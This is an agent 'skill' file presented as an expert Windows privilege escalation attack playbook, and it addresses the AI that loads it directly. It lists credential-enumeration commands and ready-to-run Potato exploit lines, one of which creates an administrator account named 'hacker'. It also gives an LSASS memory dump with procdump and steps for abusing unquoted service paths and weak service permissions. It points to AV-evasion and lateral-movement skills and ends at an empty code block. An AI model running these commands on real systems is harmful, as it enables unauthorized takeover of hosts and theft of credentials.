---
name: windows-privilege-escalation
description: "Windows local privilege escalation playbook 信号:windows提权,uac绕过,服务提权。"
when-to-use: >-
  Windows local privilege escalation playbook. Use when you have low-privilege shell access on Windows and need to escalate via token abuse, Potato exploits, service misconfigurations, DLL hijacking, UAC bypass, or registry autoruns.
---

# SKILL: Windows Local Privilege Escalation — Expert Attack Playbook

> **AI LOAD INSTRUCTION**: Expert Windows privesc techniques. Covers token manipulation, Potato family, service misconfigurations, DLL hijacking, AlwaysInstallElevated, scheduled task abuse, registry autoruns, and named pipe impersonation. Base models miss nuanced privilege prerequisites and OS-version-specific constraints.

## 0. RELATED ROUTING

Before going deep, consider loading:

- [windows-lateral-movement](../windows-lateral-movement/SKILL.md) after escalation for pivoting to other hosts
- [windows-av-evasion](../windows-av-evasion/SKILL.md) when AV/EDR blocks your privesc tools
- [active-directory-kerberos-attacks](../active-directory-kerberos-attacks/SKILL.md) when the host is domain-joined and you need AD-level escalation
- [active-directory-acl-abuse](../active-directory-acl-abuse/SKILL.md) for domain privilege escalation via ACL misconfigurations

### Advanced Reference

Also load TOKEN_POTATO_TRICKS.md when you need:
- Detailed Potato family comparison (JuicyPotato → GodPotato evolution)
- OS-version-specific exploit selection
- Required privileges and protocol details per variant

Also load UAC_BYPASS_METHODS.md when you need:
- UAC bypass technique matrix (fodhelper, eventvwr, sdclt, etc.)
- Auto-elevate binary abuse
- Mock trusted directory tricks

---

## 1. ENUMERATION CHECKLIST

### System Context

```cmd
whoami /all                        & REM Current user, groups, privileges
systeminfo                         & REM OS version, hotfixes, architecture
hostname                           & REM Machine name
net user %USERNAME%                & REM Group memberships
```

### Token Privileges (Critical)

```cmd
whoami /priv
```

| Privilege | Escalation Path |
|---|---|
| `SeImpersonatePrivilege` | Potato family exploits (§2) |
| `SeAssignPrimaryTokenPrivilege` | Token manipulation, Potato variants |
| `SeDebugPrivilege` | Dump LSASS, inject into SYSTEM processes |
| `SeBackupPrivilege` | Read any file (SAM/SYSTEM/NTDS.dit) |
| `SeRestorePrivilege` | Write any file (DLL hijack, service binary) |
| `SeTakeOwnershipPrivilege` | Take ownership of any object |
| `SeLoadDriverPrivilege` | Load vulnerable kernel driver → kernel exploit |

### Services & Scheduled Tasks

```cmd
sc query state= all                & REM All services
wmic service get name,displayname,pathname,startmode | findstr /i "auto"
schtasks /query /fo LIST /v        & REM Verbose scheduled task list
```

### Installed Software & Patches

```cmd
wmic product get name,version
wmic qfe list                      & REM Installed patches
```

### Network & Credentials

```cmd
netstat -ano                       & REM Listening ports + PIDs
cmdkey /list                       & REM Stored credentials
dir C:\Users\*\AppData\Local\Microsoft\Credentials\*
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon" 2>nul
```

---

## 2. TOKEN MANIPULATION & POTATO EXPLOITS

### SeImpersonatePrivilege Abuse

Service accounts (IIS AppPool, MSSQL, etc.) typically hold `SeImpersonatePrivilege`. This enables impersonation of any token presented to you.

| Tool | OS Support | Protocol | Notes |
|---|---|---|---|
| **JuicyPotato** | Win7–Server2016 | COM/DCOM | Requires valid CLSID; patched on Server2019+ |
| **RoguePotato** | Server2019+ | OXID resolver redirect | Needs controlled machine on port 135 |
| **PrintSpoofer** | Win10/Server2016-2019 | Named pipe via Print Spooler | Simple, fast; Spooler must run |
| **SweetPotato** | Broad | COM + Print + EFS | Combines multiple techniques |
| **GodPotato** | Win8–Server2022 | DCOM RPCSS | Works on latest patched systems |

```cmd
# PrintSpoofer (simplest for modern systems)
PrintSpoofer64.exe -i -c "cmd /c whoami"

# GodPotato (broadest compatibility)
GodPotato.exe -cmd "cmd /c net user hacker P@ss123 /add && net localgroup administrators hacker /add"

# JuicyPotato (legacy systems)
JuicyPotato.exe -l 1337 -p c:\windows\system32\cmd.exe -a "/c whoami" -t * -c {CLSID}
```

### SeDebugPrivilege Abuse

```powershell
# Dump LSASS (if SeDebugPrivilege is enabled)
procdump -ma lsass.exe lsass.dmp

# Or migrate into a SYSTEM process
# Meterpreter: migrate to winlogon.exe / services.exe
```

---

## 3. SERVICE MISCONFIGURATIONS

### Unquoted Service Paths

```cmd
# Find unquoted paths with spaces
wmic service get name,pathname,startmode | findstr /i /v "C:\Windows\\" | findstr /i /v """
```

If path is `C:\Program Files\My App\service.exe`, Windows tries:
1. `C:\Program.exe`
2. `C:\Program Files\My.exe`
3. `C:\Program Files\My App\service.exe`

Place malicious binary at first writable location.

### Weak Service Permissions

```cmd
# Check service ACL with accesschk (Sysinternals)
accesschk64.exe -wuvc * /accepteula
# Look for: SERVICE_CHANGE_CONFIG, SERVICE_ALL_ACCESS
```

```cmd

> 📎 详细内容（完整示例 / 参考 / 数据表）已拆分至同目录 `reference.md`，按需用 Read 读取对应小节。

> 📎 **参考文档说明**：本 skill 转自上游开源仓库，以下参考文档**未随本库分发**：`TOKEN_POTATO_TRICKS.md`、`UAC_BYPASS_METHODS.md`。相关主题的要点已保留在本文对应描述中；如需展开内容，请按正文关键词在库内 grep 或自行检索。
